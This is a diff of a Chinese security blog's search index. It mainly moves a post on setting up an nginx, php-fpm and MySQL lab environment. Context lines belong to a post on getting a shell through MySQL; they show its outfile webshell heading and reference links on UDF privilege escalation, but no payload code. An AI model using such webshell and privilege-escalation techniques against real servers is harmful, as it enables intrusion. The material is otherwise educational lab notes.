-<li><p>在设置好mysql密码后，使用<code>systemctl status mysql</code>查看mysql状态，若为active则可测试链接</p>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564630920244.png" class="" width="1564630920244">
-
-<p>3.测试php7链接数据库</p>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564631058876.png" class="" width="1564631058876"></li>
-</ol>
-<h2 id="0x02-坑点"><a href="#0x02-坑点" class="headerlink" title="0x02 坑点"></a>0x02 坑点</h2><p>1.配置nginx安装路径下的/etc/nginx/sites-enabled/default文件时，fastcgi_pass只能有一个，否则nigix启动会报错</p>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564582956194.png" class="" width="1564582956194">
-
-<p>2.当php7使用mysql_connect函数链接mysql数据库没有返回值，在php.ini中设置error_reporting  =  E_ALL，display_errors = On，也没有任何报错信息！后参考<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >文章<i class="fas fa-external-link-alt"></i></a> ，发现是mysql_connect支持的是php5，而我装的是php7，改用mysqli函数成功链接数据库</p>
-<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p>nginx+php+fpm运行原理  <a class="link"   href="https://segmentfault.com/a/1190000023097951" >https://segmentfault.com/a/1190000023097951<i class="fas fa-external-link-alt"></i></a></p>
-<p>php之函数mysql_connect连接mysql没有任何返回值（2019年）<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >https://blog.csdn.net/Brouce__Lee/article/details/94188470<i class="fas fa-external-link-alt"></i></a></p>
-<p>lnpm环境搭建过程  <a class="link"   href="https://www.imooc.com/article/32579" >https://www.imooc.com/article/32579<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>通过mysql获取shell的几种方法</title>
     <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[<h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p>
@@ -760,6 +716,50 @@
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.cnblogs.com/sijidou/p/10522972.html" >udf提权<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   href="https://blog.csdn.net/weixin_39872872/article/details/112589789" >写入mysql_通过MySQL写入webshell的几种方式<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   href="https://www.cnblogs.com/milantgh/p/5444398.html" >mysql dumpfile与outfile函数的区别<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>手动搭建nginx+php-fpm+mysql环境--信安之路实验</title>
+    <url>/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/</url>
+    <content><![CDATA[<h2 id="0x01-关键过程"><a href="#0x01-关键过程" class="headerlink" title="0x01 关键过程"></a>0x01 关键过程</h2><h3 id="1-安装nigix"><a href="#1-安装nigix" class="headerlink" title="1.安装nigix"></a>1.安装nigix</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install nginx	#安装nginx</span><br><span class="line">service nginx start		#启动nginx</span><br></pre></td></tr></table></figure>
+
+<p>安装后浏览器访问本地ip。</p>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564584947181.png" class="" width="1564584947181">
+
+<h3 id="2-安装php7-2-fpm和配置nginx"><a href="#2-安装php7-2-fpm和配置nginx" class="headerlink" title="2.安装php7.2-fpm和配置nginx"></a>2.安装php7.2-fpm和配置nginx</h3><ol>
+<li><p><strong>安装php7.2</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install php7.2-fpm</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>修改nginx配置文件</strong></p>
+<p>为使nginx支持php解析，需设置fastcgi解析器的路径，修改nginx安装目录的文件<code>/etc/nginx/sites-available/default</code>，如图。</p>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564585815801.png" class="" width="1564585815801">
+
+<p>重启nginx。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>设置php-fpm的监听端口</strong></p>
+<p>修改php-fpm安装目录下配置文件<code>/etc/php/7.2/fpm/pool.d/www.conf</code>，查看是否同nginx配置文件的路径或监听的端口一致，如图。</p>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564586839658.png" class="" width="1564586839658"></li>
+<li><p><strong>测试配置是否成功</strong></p>
+<p>进入<code>/var/www/html/</code>目录下添加<code>test.php</code>测试文件，浏览器访问（若第三步未配置会报502错误），配置成功情况如下图。</p>
+</li>
+</ol>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564587125109.png" class="" width="1564587125109">
+
+<h3 id="3-安装mysql"><a href="#3-安装mysql" class="headerlink" title="3.安装mysql"></a>3.安装mysql</h3><ol>
+<li><p>安装mysql</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get -y install mysql-server mysql-client	#安装mysql</span><br><span class="line">apt-get install php7.2-mysql	#安装php支撑mysql的模块</span><br></pre></td></tr></table></figure></li>
+<li><p>在设置好mysql密码后，使用<code>systemctl status mysql</code>查看mysql状态，若为active则可测试链接</p>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564630920244.png" class="" width="1564630920244">
+
+<p>3.测试php7链接数据库</p>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564631058876.png" class="" width="1564631058876"></li>
+</ol>
+<h2 id="0x02-坑点"><a href="#0x02-坑点" class="headerlink" title="0x02 坑点"></a>0x02 坑点</h2><p>1.配置nginx安装路径下的/etc/nginx/sites-enabled/default文件时，fastcgi_pass只能有一个，否则nigix启动会报错</p>
+<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564582956194.png" class="" width="1564582956194">
+
+<p>2.当php7使用mysql_connect函数链接mysql数据库没有返回值，在php.ini中设置error_reporting  =  E_ALL，display_errors = On，也没有任何报错信息！后参考<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >文章<i class="fas fa-external-link-alt"></i></a> ，发现是mysql_connect支持的是php5，而我装的是php7，改用mysqli函数成功链接数据库</p>
+<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p>nginx+php+fpm运行原理  <a class="link"   href="https://segmentfault.com/a/1190000023097951" >https://segmentfault.com/a/1190000023097951<i class="fas fa-external-link-alt"></i></a></p>
+<p>php之函数mysql_connect连接mysql没有任何返回值（2019年）<a class="link"   href="https://blog.csdn.net/Brouce__Lee/article/details/94188470" >https://blog.csdn.net/Brouce__Lee/article/details/94188470<i class="fas fa-external-link-alt"></i></a></p>
+<p>lnpm环境搭建过程  <a class="link"   href="https://www.imooc.com/article/32579" >https://www.imooc.com/article/32579<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
   </entry>
 </search>
